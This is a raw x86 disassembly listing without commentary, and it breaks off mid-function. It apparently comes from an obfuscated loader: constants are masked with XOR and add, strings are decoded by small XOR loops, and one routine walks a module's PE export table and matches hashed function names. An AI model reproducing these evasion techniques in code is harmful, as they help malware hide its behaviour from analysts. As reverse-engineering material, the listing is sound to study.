  4268c7:	sub    esp,0x21c
  4268cd:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4268d4:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  4268db:	mov    eax,DWORD PTR [ebp+0x10]
  4268de:	mov    eax,DWORD PTR [ebp-0x4]
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	push   esi
  4268e5:	push   edi
  4268e6:	mov    edi,0x75108a4
  4268eb:	xor    eax,edi
  4268ed:	mov    esi,0x3272ec
  4268f2:	add    eax,esi
  4268f4:	cmp    eax,ecx
  4268f6:	mov    eax,DWORD PTR [ebp-0x4]
  4268f9:	jne    0x426904
  4268fb:	xor    eax,edi
  4268fd:	add    eax,esi
  4268ff:	jmp    0x4269b0
  426904:	mov    ecx,DWORD PTR [ebp+0xc]
  426907:	xor    eax,edi
  426909:	add    eax,esi
  42690b:	cmp    eax,ecx
  42690d:	jne    0x426914
  42690f:	mov    eax,DWORD PTR [ebp-0x4]
  426912:	jmp    0x4268fb
  426914:	lea    eax,[ebp-0x21c]
  42691a:	mov    DWORD PTR [ebp-0x8],eax
  42691d:	mov    eax,DWORD PTR [ebp+0xc]
  426920:	mov    DWORD PTR [ebp-0x10],eax
  426923:	mov    eax,DWORD PTR [ebp-0x4]
  426926:	xor    eax,edi
  426928:	add    eax,esi
  42692a:	mov    DWORD PTR [ebp+0x10],eax
  42692d:	mov    eax,DWORD PTR [ebp+0xc]
  426930:	push   ebx
  426931:	call   0x42665b
  426936:	mov    ebx,eax
  426938:	mov    eax,DWORD PTR [ebp+0x8]
  42693b:	mov    eax,DWORD PTR [eax+0x14]
  42693e:	jmp    0x426998
  426940:	mov    eax,DWORD PTR [ebp+0xc]
  426943:	sub    eax,0x8
  426946:	mov    DWORD PTR [ebp-0xc],eax
  426949:	mov    eax,DWORD PTR [ebp-0xc]
  42694c:	mov    eax,DWORD PTR [eax+0x28]
  42694f:	call   0x426543
  426954:	mov    DWORD PTR [ebp+0x10],eax
  426957:	push   DWORD PTR [ebp+0x10]
  42695a:	mov    edx,DWORD PTR [ebp-0x8]
  42695d:	call   0x4266ea
  426962:	mov    eax,DWORD PTR [ebp-0x4]
  426965:	xor    eax,edi
  426967:	add    eax,esi
  426969:	cmp    eax,ebx
  42696b:	jne    0x426975
  42696d:	mov    eax,DWORD PTR [ebp-0x8]
  426970:	call   0x4265d1
  426975:	mov    eax,DWORD PTR [ebp-0x14]
  426978:	xor    eax,edi
  42697a:	add    eax,esi
  42697c:	push   eax
  42697d:	push   DWORD PTR [ebp-0x10]
  426980:	mov    eax,DWORD PTR [ebp-0x8]
  426983:	call   0x4262fd
  426988:	mov    ecx,DWORD PTR [ebp-0x4]
  42698b:	xor    ecx,edi
  42698d:	add    ecx,esi
  42698f:	cmp    eax,ecx
  426991:	je     0x4269b6
  426993:	mov    eax,DWORD PTR [ebp+0xc]
  426996:	mov    eax,DWORD PTR [eax]
  426998:	mov    DWORD PTR [ebp+0xc],eax
  42699b:	mov    eax,DWORD PTR [ebp+0x8]
  42699e:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a1:	add    eax,0x14
  4269a4:	cmp    ecx,eax
  4269a6:	jne    0x426940
  4269a8:	mov    eax,DWORD PTR [ebp-0x4]
  4269ab:	xor    eax,edi
  4269ad:	add    eax,esi
  4269af:	pop    ebx
  4269b0:	pop    edi
  4269b1:	pop    esi
  4269b2:	leave  
  4269b3:	ret    0xc
  4269b6:	mov    eax,DWORD PTR [ebp-0xc]
  4269b9:	mov    eax,DWORD PTR [eax+0x18]
  4269bc:	jmp    0x4269af
  4269be:	push   ebp
  4269bf:	mov    ebp,esp
  4269c1:	mov    eax,DWORD PTR [ebp+0xc]
  4269c4:	sub    esp,0x10
  4269c7:	cmp    DWORD PTR [ebp+0x8],0x0
  4269cb:	push   ebx
  4269cc:	push   esi
  4269cd:	push   edi
  4269ce:	je     0x426a83
  4269d4:	test   eax,eax
  4269d6:	je     0x426a83
  4269dc:	movzx  eax,WORD PTR [eax+0x20]
  4269e0:	mov    ecx,eax
  4269e2:	mov    DWORD PTR [ebp-0x10],eax
  4269e5:	xor    edx,edx
  4269e7:	and    DWORD PTR [ebp-0x8],edx
  4269ea:	mov    eax,0x8a94
  4269ef:	xor    ecx,eax
  4269f1:	add    ecx,0x3b56
  4269f7:	mov    DWORD PTR [ebp-0xc],ecx
  4269fa:	and    DWORD PTR [ebp-0x4],0x0
  4269fe:	xor    ecx,ecx
  426a00:	push   0x7c
  426a02:	pop    edi
  426a03:	cmp    cx,WORD PTR [ebp-0xc]
  426a07:	jae    0x426a6d
  426a09:	lea    esi,[edx-0x3b56]
  426a0f:	xor    esi,eax
  426a11:	movzx  ecx,WORD PTR [ebp-0x4]
  426a15:	mov    ebx,DWORD PTR [ebp+0xc]
  426a18:	lea    ecx,[ebx+ecx*4]
  426a1b:	cmp    WORD PTR [ecx+0x2],si
  426a1f:	jne    0x426a58
  426a21:	movzx  ecx,WORD PTR [ecx]
  426a24:	mov    edi,0x4e3e
  426a29:	cmp    cx,di
  426a2c:	jne    0x426a3a
  426a2e:	mov    ebx,DWORD PTR [ebp+0x8]
  426a31:	movzx  edi,dx
  426a34:	cmp    BYTE PTR [edi+ebx*1],0x0
  426a38:	je     0x426a67
  426a3a:	mov    ebx,DWORD PTR [ebp+0x8]
  426a3d:	movzx  edi,dx
  426a40:	movsx  di,BYTE PTR [edi+ebx*1]
  426a45:	mov    ebx,0x3b56
  426a4a:	sub    di,bx
  426a4d:	xor    di,ax
  426a50:	cmp    cx,di
  426a53:	je     0x426a67
  426a55:	push   0x7a
  426a57:	pop    edi
  426a58:	inc    DWORD PTR [ebp-0x4]
  426a5b:	mov    cx,WORD PTR [ebp-0xc]
  426a5f:	cmp    WORD PTR [ebp-0x4],cx
  426a63:	jb     0x426a11
  426a65:	jmp    0x426a6d
  426a67:	inc    DWORD PTR [ebp-0x8]
  426a6a:	push   0x7d
  426a6c:	pop    edi
  426a6d:	mov    esi,DWORD PTR [ebp+0x8]
  426a70:	movzx  ecx,dx
  426a73:	cmp    BYTE PTR [ecx+esi*1],0x0
  426a77:	je     0x426a8c
  426a79:	inc    edx
  426a7a:	cmp    edi,0x7a
  426a7d:	jne    0x4269fa
  426a83:	xor    eax,eax
  426a85:	pop    edi
  426a86:	pop    esi
  426a87:	pop    ebx
  426a88:	leave  
  426a89:	ret    0x8
  426a8c:	mov    ecx,DWORD PTR [ebp-0x8]
  426a8f:	add    ecx,0xffffc4aa
  426a95:	xor    cx,ax
  426a98:	xor    eax,eax
  426a9a:	cmp    cx,WORD PTR [ebp-0x10]
  426a9e:	sete   al
  426aa1:	jmp    0x426a85
  426aa3:	push   ebp
  426aa4:	mov    ebp,esp
  426aa6:	sub    esp,0x50
  426aa9:	push   edi
  426aaa:	mov    edi,eax
  426aac:	mov    eax,DWORD PTR [edi+0x1a8]
  426ab2:	cmp    DWORD PTR [eax],0x0
  426ab5:	jne    0x426abe
  426ab7:	xor    eax,eax
  426ab9:	jmp    0x426bef
  426abe:	push   DWORD PTR [ebp+0x8]
  426ac1:	push   0x2c
  426ac3:	pop    eax
  426ac4:	call   0x426853
  426ac9:	mov    edx,DWORD PTR [edi+0x1ac]
  426acf:	lea    eax,[edi+0x22]
  426ad2:	mov    DWORD PTR [ebp-0x4c],eax
  426ad5:	lea    eax,[edi+0x44]
  426ad8:	mov    DWORD PTR [ebp-0x48],eax
  426adb:	lea    eax,[edi+0x66]
  426ade:	mov    DWORD PTR [ebp-0x44],eax
  426ae1:	lea    eax,[edi+0x88]
  426ae7:	mov    DWORD PTR [ebp-0x40],eax
  426aea:	lea    eax,[edi+0xaa]
  426af0:	mov    DWORD PTR [ebp-0x3c],eax
  426af3:	lea    eax,[edi+0xcc]
  426af9:	mov    DWORD PTR [ebp-0x38],eax
  426afc:	lea    eax,[edi+0xee]
  426b02:	mov    DWORD PTR [ebp-0x34],eax
  426b05:	lea    eax,[edi+0x110]
  426b0b:	mov    DWORD PTR [ebp-0x30],eax
  426b0e:	lea    eax,[edi+0x132]
  426b14:	mov    DWORD PTR [ebp-0x2c],eax
  426b17:	lea    eax,[edi+0x154]
  426b1d:	push   edi
  426b1e:	mov    DWORD PTR [ebp-0x50],edi
  426b21:	mov    DWORD PTR [ebp-0x28],eax
  426b24:	call   0x426c23
  426b29:	push   eax
  426b2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426b30:	push   DWORD PTR [eax]
  426b32:	call   0x4268c4
  426b37:	mov    DWORD PTR [ebp-0x10],eax
  426b3a:	test   eax,eax
  426b3c:	je     0x426bef
  426b42:	mov    ecx,DWORD PTR [eax+0x3c]
  426b45:	push   ebx
  426b46:	push   esi
  426b47:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426b4b:	add    esi,eax
  426b4d:	mov    edi,DWORD PTR [esi+0x24]
  426b50:	mov    ecx,DWORD PTR [esi+0x1c]
  426b53:	mov    edx,DWORD PTR [esi+0x20]
  426b56:	mov    ebx,DWORD PTR [esi+0x18]
  426b59:	add    edi,eax
  426b5b:	mov    DWORD PTR [ebp-0x20],edi
  426b5e:	mov    edi,DWORD PTR [esi+0x14]
  426b61:	add    ecx,eax
  426b63:	add    edx,eax
  426b65:	mov    DWORD PTR [ebp-0xc],ecx
  426b68:	mov    DWORD PTR [ebp-0x1c],edx
  426b6b:	mov    DWORD PTR [ebp-0x8],edi
  426b6e:	cmp    edi,ebx
  426b70:	ja     0x426b75
  426b72:	mov    DWORD PTR [ebp-0x8],ebx
  426b75:	xor    ebx,ebx
  426b77:	mov    DWORD PTR [ebp-0x18],ebx
  426b7a:	cmp    DWORD PTR [ebp-0x8],ebx
  426b7d:	jbe    0x426bed
  426b7f:	jmp    0x426b84
  426b81:	mov    edx,DWORD PTR [ebp-0x1c]
  426b84:	mov    edi,DWORD PTR [ebp-0x20]
  426b87:	movzx  edi,WORD PTR [edi+ebx*2]
  426b8b:	cmp    ebx,DWORD PTR [esi+0x18]
  426b8e:	jae    0x426bed
  426b90:	cmp    edi,DWORD PTR [esi+0x14]
  426b93:	jae    0x426bed
  426b95:	mov    ebx,DWORD PTR [edx+ebx*4]
  426b98:	mov    edx,DWORD PTR [ebp+0x8]
  426b9b:	mov    edi,DWORD PTR [ecx+edi*4]
  426b9e:	mov    DWORD PTR [ebp-0x4],edx
  426ba1:	lea    edx,[ebp-0x50]
  426ba4:	add    ebx,eax
  426ba6:	add    edi,eax
  426ba8:	sub    edx,DWORD PTR [ebp+0x8]
  426bab:	mov    DWORD PTR [ebp-0x14],0xb
  426bb2:	mov    DWORD PTR [ebp-0x24],edx
  426bb5:	mov    edx,DWORD PTR [ebp-0x4]
  426bb8:	cmp    DWORD PTR [edx],0x0
  426bbb:	jne    0x426bd8
  426bbd:	mov    eax,DWORD PTR [ebp-0x24]
  426bc0:	push   DWORD PTR [eax+edx*1]
  426bc3:	push   ebx
  426bc4:	call   0x4269be
  426bc9:	mov    ecx,DWORD PTR [ebp-0xc]
  426bcc:	test   eax,eax
  426bce:	je     0x426bd5
  426bd0:	mov    eax,DWORD PTR [ebp-0x4]
  426bd3:	mov    DWORD PTR [eax],edi
  426bd5:	mov    eax,DWORD PTR [ebp-0x10]
  426bd8:	add    DWORD PTR [ebp-0x4],0x4
  426bdc:	dec    DWORD PTR [ebp-0x14]
  426bdf:	jne    0x426bb5
  426be1:	mov    ebx,DWORD PTR [ebp-0x18]
  426be4:	inc    ebx
  426be5:	mov    DWORD PTR [ebp-0x18],ebx
  426be8:	cmp    ebx,DWORD PTR [ebp-0x8]
  426beb:	jb     0x426b81
  426bed:	pop    esi
  426bee:	pop    ebx
  426bef:	pop    edi
  426bf0:	leave  
  426bf1:	ret    0x4
  426bf4:	push   ebp
  426bf5:	mov    ebp,esp
  426bf7:	mov    eax,DWORD PTR [ebp+0x8]
  426bfa:	push   esi
  426bfb:	push   DWORD PTR [eax+0x1d8]
  426c01:	lea    esi,[eax+0x198]
  426c07:	mov    eax,DWORD PTR [ebp+0x8]
  426c0a:	call   0x426aa3
  426c0f:	mov    ecx,DWORD PTR [esi]
  426c11:	mov    DWORD PTR [ecx],eax
  426c13:	mov    eax,DWORD PTR [esi]
  426c15:	xor    ecx,ecx
  426c17:	cmp    DWORD PTR [eax],ecx
  426c19:	pop    esi
  426c1a:	setne  cl
  426c1d:	mov    eax,ecx
  426c1f:	pop    ebp
  426c20:	ret    0x4
  426c23:	mov    ecx,DWORD PTR [edi+0x188]
  426c29:	push   ebx
  426c2a:	jmp    0x426c3f
  426c2c:	xor    eax,0x8a94
  426c31:	add    eax,0x3b56
  426c36:	mov    WORD PTR [ecx],ax
  426c39:	add    ecx,0x2
  426c3c:	add    edx,0x2
  426c3f:	movzx  eax,WORD PTR [edx]
  426c42:	mov    ebx,0x4e3e
  426c47:	cmp    ax,bx
  426c4a:	jne    0x426c2c
  426c4c:	xor    eax,eax
  426c4e:	mov    WORD PTR [ecx],ax
  426c51:	mov    eax,DWORD PTR [edi+0x188]
  426c57:	pop    ebx
  426c58:	ret    
  426c59:	push   edi
  426c5a:	mov    edi,eax
  426c5c:	mov    eax,DWORD PTR [esi+0x188]
  426c62:	shl    edi,0x6
  426c65:	add    eax,edi
  426c67:	jmp    0x426c73
  426c69:	xor    cl,0x79
  426c6c:	sub    cl,0x3
  426c6f:	mov    BYTE PTR [eax],cl
  426c71:	inc    eax
  426c72:	inc    edx
  426c73:	mov    cl,BYTE PTR [edx]
  426c75:	cmp    cl,0x7a
  426c78:	jne    0x426c69
  426c7a:	mov    BYTE PTR [eax],0x0
  426c7d:	mov    eax,DWORD PTR [esi+0x188]
  426c83:	add    eax,edi
  426c85:	pop    edi
  426c86:	ret    
  426c87:	push   ebp
  426c88:	mov    ebp,esp
  426c8a:	sub    esp,0x14
  426c8d:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  426c94:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  426c9b:	mov    eax,DWORD PTR [ebx]
  426c9d:	mov    DWORD PTR [ebp-0x8],eax
  426ca0:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  426ca7:	push   esi
  426ca8:	push   edi
  426ca9:	mov    DWORD PTR [ebp-0x14],0xead71890
  426cb0:	mov    edi,DWORD PTR [ebp-0x4]
  426cb3:	mov    ecx,DWORD PTR [ebp-0x10]
  426cb6:	mov    eax,0x75108a4
  426cbb:	xor    edi,eax
  426cbd:	mov    edx,0x3272ec
  426cc2:	xor    ecx,eax
  426cc4:	add    edi,edx
  426cc6:	add    ecx,edx
  426cc8:	imul   edi,ecx
  426ccb:	jmp    0x426d13
  426ccd:	mov    ecx,DWORD PTR [ebp-0x8]
  426cd0:	mov    esi,DWORD PTR [ebp-0x4]
  426cd3:	xor    ecx,eax
  426cd5:	xor    esi,eax
  426cd7:	add    ecx,edx
  426cd9:	add    esi,edx
  426cdb:	test   esi,ecx
  426cdd:	mov    esi,DWORD PTR [ebp-0x8]
  426ce0:	mov    ecx,DWORD PTR [ebp-0x4]
  426ce3:	je     0x426cfa
  426ce5:	xor    ecx,eax
  426ce7:	xor    esi,eax
  426ce9:	add    ecx,edx
  426ceb:	add    esi,edx
  426ced:	shr    esi,cl
  426cef:	mov    ecx,DWORD PTR [ebp-0x14]
  426cf2:	xor    ecx,eax
  426cf4:	add    ecx,edx
  426cf6:	xor    esi,ecx
  426cf8:	jmp    0x426d04
  426cfa:	xor    esi,eax
  426cfc:	xor    ecx,eax
  426cfe:	add    esi,edx
  426d00:	add    ecx,edx
  426d02:	shr    esi,cl
  426d04:	mov    DWORD PTR [ebp-0x8],esi
  426d07:	mov    ecx,DWORD PTR [ebp-0x4]
  426d0a:	xor    ecx,eax
  426d0c:	lea    edi,[edi+ecx*1+0x3272ec]
  426d13:	mov    ecx,DWORD PTR [ebp-0xc]
  426d16:	mov    esi,DWORD PTR [ebp-0x4]
  426d19:	xor    esi,eax
  426d1b:	xor    ecx,eax
  426d1d:	sub    ecx,esi
  426d1f:	cmp    edi,ecx
  426d21:	jbe    0x426ccd
  426d23:	mov    eax,DWORD PTR [ebp-0x8]
  426d26:	pop    edi
  426d27:	mov    DWORD PTR [ebx],eax
  426d29:	mov    eax,DWORD PTR [ebp-0x8]
  426d2c:	pop    esi
  426d2d:	leave  
  426d2e:	ret    
  426d2f:	push   ebp
  426d30:	mov    ebp,esp
  426d32:	sub    esp,0x38
  426d35:	push   ebx
  426d36:	mov    ebx,0xf89c85b0
  426d3b:	mov    DWORD PTR [ebp-0x4],ebx
  426d3e:	lea    eax,[ebx+0x1]
  426d41:	push   esi
  426d42:	mov    DWORD PTR [ebp-0x24],eax
  426d45:	mov    ecx,DWORD PTR [ebp-0x4]
  426d48:	mov    edx,DWORD PTR [ebp+0x8]
  426d4b:	mov    esi,0x75108a4
  426d50:	push   edi
  426d51:	xor    ecx,esi
  426d53:	mov    edi,0x3272ec
  426d58:	add    ecx,edi
  426d5a:	cmp    edx,ecx
  426d5c:	je     0x426ec2
  426d62:	mov    ecx,DWORD PTR [ebp-0x4]
  426d65:	mov    edx,DWORD PTR [ebp+0xc]
  426d68:	xor    ecx,esi
  426d6a:	add    ecx,edi
  426d6c:	cmp    edx,ecx
  426d6e:	je     0x426ec2
  426d74:	mov    ecx,DWORD PTR [ebp+0x10]
  426d77:	mov    DWORD PTR [ebp-0x14],ecx
  426d7a:	mov    ecx,DWORD PTR [ebp+0xc]
  426d7d:	mov    edx,DWORD PTR [ebp+0x8]
  426d80:	mov    DWORD PTR [ebp-0x18],0xf89c8533
  426d87:	mov    DWORD PTR [ebp-0x1c],eax
  426d8a:	mov    DWORD PTR [ebp-0x10],ebx
  426d8d:	mov    DWORD PTR [ebp+0xc],eax
  426d90:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  426d97:	mov    eax,DWORD PTR [ebp+0xc]
  426d9a:	xor    eax,esi
  426d9c:	mov    DWORD PTR [ebp-0x20],ecx
  426d9f:	sub    ecx,eax
  426da1:	sub    ecx,edi
  426da3:	mov    DWORD PTR [ebp+0x8],ecx
  426da6:	mov    DWORD PTR [ebp-0xc],edx
  426da9:	mov    DWORD PTR [ebp-0x8],0xf89c85bd
  426db0:	jmp    0x426eb2
  426db5:	mov    eax,DWORD PTR [ebp+0xc]
  426db8:	mov    ecx,DWORD PTR [ebp+0xc]
  426dbb:	xor    eax,esi
  426dbd:	xor    ecx,esi
  426dbf:	lea    ecx,[eax+ecx*1+0x64e5d8]
  426dc6:	mov    eax,DWORD PTR [ebp+0x8]
  426dc9:	xor    edx,edx
  426dcb:	div    ecx
  426dcd:	mov    eax,DWORD PTR [ebp+0x10]
  426dd0:	mov    ecx,DWORD PTR [ebp+0xc]
  426dd3:	xor    eax,esi
  426dd5:	xor    ecx,esi
  426dd7:	sub    eax,ecx
  426dd9:	cmp    edx,eax
  426ddb:	jne    0x426e71
  426de1:	mov    eax,DWORD PTR [ebp+0x8]
  426de4:	mov    ecx,DWORD PTR [ebp-0xc]
  426de7:	mov    dl,BYTE PTR [eax+ecx*1]
  426dea:	mov    eax,DWORD PTR [ebp-0x10]
  426ded:	mov    ecx,DWORD PTR [ebp-0x8]
  426df0:	xor    eax,esi
  426df2:	xor    ecx,esi
  426df4:	add    eax,edi
  426df6:	add    ecx,edi
  426df8:	cmp    eax,ecx
  426dfa:	jae    0x426e42
  426dfc:	lea    ecx,[eax-0x3272ec]
  426e02:	mov    DWORD PTR [ebp-0x4],ecx
  426e05:	mov    ebx,DWORD PTR [ebp-0x4]
  426e08:	xor    ebx,esi
  426e0a:	add    ebx,0x7f55d8f2
  426e10:	lea    ecx,[ebp+eax*4-0x38]
  426e14:	mov    DWORD PTR [ecx],ebx
  426e16:	mov    ebx,DWORD PTR [ecx]
  426e18:	cmp    ebx,0x244ecb93
  426e1e:	jbe    0x426e28
  426e20:	add    DWORD PTR [ecx],0x405fcdc
  426e26:	jmp    0x426e2e
  426e28:	add    DWORD PTR [ecx],0xfdaf4324
  426e2e:	mov    ecx,DWORD PTR [ebp-0x8]
  426e31:	xor    ecx,esi
  426e33:	inc    eax
  426e34:	inc    DWORD PTR [ebp-0x4]
  426e37:	add    ecx,edi
  426e39:	cmp    eax,ecx
  426e3b:	jb     0x426e05
  426e3d:	mov    ebx,0xf89c85b0
  426e42:	cmp    DWORD PTR [ebp-0x14],0x0
  426e46:	jne    0x426e50
  426e48:	xor    dl,0x79
  426e4b:	sub    dl,0x3
  426e4e:	jmp    0x426e66
  426e50:	mov    eax,DWORD PTR [ebp-0x18]
  426e53:	xor    al,0xa4
  426e55:	mov    cl,0x14
  426e57:	sub    cl,al
  426e59:	add    dl,cl
  426e5b:	mov    ecx,DWORD PTR [ebp-0x1c]
  426e5e:	xor    cl,0xa4
  426e61:	sub    cl,0x14
  426e64:	ror    dl,cl
  426e66:	xor    eax,eax
  426e68:	mov    eax,DWORD PTR [ebp+0x8]
  426e6b:	mov    ecx,DWORD PTR [ebp-0xc]
  426e6e:	mov    BYTE PTR [eax+ecx*1],dl
  426e71:	mov    eax,DWORD PTR [ebp+0x8]
  426e74:	mov    ecx,DWORD PTR [ebp-0x10]
  426e77:	sub    eax,edi
  426e79:	xor    eax,esi
  426e7b:	cmp    eax,ecx
  426e7d:	jne    0x426ea0
  426e7f:	mov    eax,DWORD PTR [ebp+0x10]
  426e82:	mov    ecx,DWORD PTR [ebp+0xc]
  426e85:	xor    eax,esi
  426e87:	xor    ecx,esi
  426e89:	sub    eax,ecx
  426e8b:	mov    ecx,DWORD PTR [ebp-0x20]
  426e8e:	sub    eax,edi
  426e90:	xor    eax,esi
  426e92:	mov    DWORD PTR [ebp+0x10],eax
  426e95:	mov    eax,DWORD PTR [ebp+0xc]
  426e98:	xor    eax,esi
  426e9a:	sub    ecx,eax
  426e9c:	sub    ecx,edi
  426e9e:	jmp    0x426eaf
  426ea0:	mov    eax,DWORD PTR [ebp+0xc]
  426ea3:	xor    eax,esi
  426ea5:	mov    ecx,0xffcd8d14
  426eaa:	sub    ecx,eax
  426eac:	add    ecx,DWORD PTR [ebp+0x8]
  426eaf:	mov    DWORD PTR [ebp+0x8],ecx
  426eb2:	mov    eax,DWORD PTR [ebp+0x10]
  426eb5:	cmp    eax,ebx
  426eb7:	jne    0x426db5
  426ebd:	mov    eax,DWORD PTR [ebp-0x24]
  426ec0:	jmp    0x426ec5
  426ec2:	mov    eax,DWORD PTR [ebp-0x4]
  426ec5:	xor    eax,esi
  426ec7:	add    eax,edi
  426ec9:	pop    edi
  426eca:	pop    esi
  426ecb:	pop    ebx
  426ecc:	leave  
  426ecd:	ret    0xc
  426ed0:	push   ebp
  426ed1:	mov    ebp,esp
  426ed3:	sub    esp,0x420
  426ed9:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  426ee0:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  426ee7:	mov    DWORD PTR [ebp-0x18],0xf89c86b0
  426eee:	push   ebx
  426eef:	mov    DWORD PTR [ebp-0x1c],0xf89c85b7
  426ef6:	mov    eax,DWORD PTR [ebp-0x14]
  426ef9:	push   esi
  426efa:	mov    esi,0x75108a4
  426eff:	push   edi
  426f00:	xor    eax,esi
  426f02:	mov    edi,0x3272ec
  426f07:	add    eax,edi
  426f09:	mov    DWORD PTR [ebp-0x8],eax
  426f0c:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  426f13:	mov    DWORD PTR [ebp-0x4],0xead71890
  426f1a:	mov    DWORD PTR [ebp-0x10],0x8
  426f21:	mov    ecx,ecx
  426f23:	mov    eax,DWORD PTR [ebp-0xc]
  426f26:	mov    ecx,DWORD PTR [ebp-0x14]
  426f29:	xor    eax,esi
  426f2b:	xor    ecx,esi
  426f2d:	add    eax,edi
  426f2f:	add    ecx,edi
  426f31:	imul   eax,ecx
  426f34:	jmp    0x426f67
  426f36:	mov    eax,DWORD PTR [ebp-0x4]
  426f39:	sub    eax,edi
  426f3b:	xor    eax,esi
  426f3d:	mov    DWORD PTR [ebp-0x8],eax
  426f40:	lea    ebx,[ebp-0x8]
  426f43:	call   0x426c87
  426f48:	mov    DWORD PTR [ebp-0x8],eax
  426f4b:	mov    eax,DWORD PTR [ebp-0x8]
  426f4e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f51:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  426f58:	mov    eax,DWORD PTR [ebp-0xc]
  426f5b:	mov    ecx,DWORD PTR [ebp-0x4]
  426f5e:	xor    eax,esi
  426f60:	lea    eax,[eax+ecx*1+0x3272ec]
  426f67:	mov    DWORD PTR [ebp-0x4],eax
  426f6a:	mov    eax,DWORD PTR [ebp-0x18]
  426f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  426f70:	xor    ecx,esi
  426f72:	xor    eax,esi
  426f74:	sub    eax,ecx
  426f76:	mov    ecx,DWORD PTR [ebp-0x4]
  426f79:	cmp    ecx,eax
  426f7b:	jbe    0x426f36
  426f7d:	mov    eax,DWORD PTR [ebp-0x1c]
  426f80:	xor    eax,esi
  426f82:	add    eax,edi
  426f84:	mov    DWORD PTR [ebp-0x8],eax
  426f87:	mov    DWORD PTR [ebp-0x18],0xf89c86b7
  426f8e:	mov    ebx,ebx
  426f90:	jmp    0x426ff3
  426f92:	mov    ecx,DWORD PTR [ebp-0x20]
  426f95:	mov    eax,DWORD PTR [ebp-0x8]
  426f98:	xor    ecx,esi
  426f9a:	add    ecx,edi
  426f9c:	shr    eax,cl
  426f9e:	mov    DWORD PTR [ebp-0x4],eax
  426fa1:	mov    eax,DWORD PTR [ebp+0x8]
  426fa4:	mov    cl,BYTE PTR [eax]
  426fa6:	mov    BYTE PTR [ebp+0xb],cl
  426fa9:	mov    cl,BYTE PTR [ebp+0xb]
  426fac:	mov    edx,DWORD PTR [ebp-0x8]
  426faf:	movzx  ecx,cl
  426fb2:	xor    ecx,edx
  426fb4:	mov    DWORD PTR [ebp+0x8],ecx
  426fb7:	mov    ecx,DWORD PTR [ebp-0x18]
  426fba:	mov    edx,DWORD PTR [ebp+0x8]
  426fbd:	xor    ecx,esi
  426fbf:	add    ecx,edi
  426fc1:	and    ecx,edx
  426fc3:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  426fca:	mov    edx,DWORD PTR [ebp-0x4]
  426fcd:	xor    ecx,edx
  426fcf:	mov    DWORD PTR [ebp-0x8],ecx
  426fd2:	mov    ecx,DWORD PTR [ebp-0xc]
  426fd5:	xor    ecx,esi
  426fd7:	lea    eax,[eax+ecx*1+0x3272ec]
  426fde:	mov    DWORD PTR [ebp+0x8],eax
  426fe1:	mov    eax,DWORD PTR [ebp-0xc]
  426fe4:	xor    eax,esi
  426fe6:	mov    ecx,0xffcd8d14
  426feb:	sub    ecx,eax
  426fed:	add    ecx,DWORD PTR [ebp-0x10]
  426ff0:	mov    DWORD PTR [ebp-0x10],ecx
  426ff3:	mov    eax,DWORD PTR [ebp-0x14]
  426ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  426ff9:	xor    eax,esi
  426ffb:	add    eax,edi
  426ffd:	cmp    ecx,eax
  426fff:	jne    0x426f92
  427001:	mov    eax,DWORD PTR [ebp-0x1c]
  427004:	mov    ecx,DWORD PTR [ebp-0x8]
  427007:	xor    eax,esi
  427009:	add    eax,edi
  42700b:	pop    edi
  42700c:	pop    esi
  42700d:	xor    eax,ecx
  42700f:	pop    ebx
  427010:	leave  
  427011:	ret    0x4
  427014:	push   ebp
  427015:	mov    ebp,esp
  427017:	mov    eax,DWORD PTR [ebp+0x1c]
  42701a:	mov    ecx,DWORD PTR [ebp+0x8]
  42701d:	mov    edx,DWORD PTR [ebp+0x10]
  427020:	mov    eax,DWORD PTR [eax+0x190]
  427026:	mov    eax,DWORD PTR [eax]
  427028:	sub    esp,0x64
  42702b:	push   ebx
  42702c:	push   esi
  42702d:	push   edi
  42702e:	mov    edi,0x75108a4
  427033:	xor    ecx,edi
  427035:	mov    ebx,0x3272ec
  42703a:	add    ecx,ebx
  42703c:	cmp    ecx,edx
  42703e:	jne    0x42704f
  427040:	or     DWORD PTR ds:0x3750c3e,0x4263eb2f
  42704a:	jmp    0x42754b
  42704f:	mov    ecx,DWORD PTR [ebp+0x8]
  427052:	mov    esi,DWORD PTR [ebp+0x14]
  427055:	mov    edx,DWORD PTR [esi]
  427057:	xor    ecx,edi
  427059:	add    ecx,ebx
  42705b:	cmp    edx,ecx
  42705d:	je     0x427506
  427063:	mov    ecx,DWORD PTR [ebp+0x1c]
  427066:	mov    DWORD PTR [ebp-0x1c],eax
  427069:	mov    DWORD PTR [ebp+0x1c],ecx
  42706c:	mov    ecx,DWORD PTR [ebp+0x18]
  42706f:	mov    eax,DWORD PTR [esi]
  427071:	mov    DWORD PTR [ebp-0x20],eax
  427074:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  42707b:	mov    edx,0xf89c85b1
  427080:	mov    DWORD PTR [ebp-0x8],edx
  427083:	mov    eax,DWORD PTR [ebp+0x1c]
  427086:	mov    DWORD PTR [ebp+0x1c],eax
  427089:	mov    eax,DWORD PTR [ebp+0x1c]
  42708c:	mov    eax,DWORD PTR [eax+0x190]
  427092:	mov    eax,DWORD PTR [eax]
  427094:	mov    DWORD PTR [ebp-0x24],ecx
  427097:	mov    ecx,DWORD PTR [ebp+0x1c]
  42709a:	mov    ecx,DWORD PTR [ecx+0x190]
  4270a0:	mov    ecx,DWORD PTR [ecx]
  4270a2:	add    ecx,DWORD PTR [eax+0x3c]
  4270a5:	mov    DWORD PTR [ebp+0x10],ecx
  4270a8:	mov    eax,DWORD PTR [ebp+0x8]
  4270ab:	xor    eax,edi
  4270ad:	add    eax,ebx
  4270af:	mov    DWORD PTR [ebp-0x4],eax
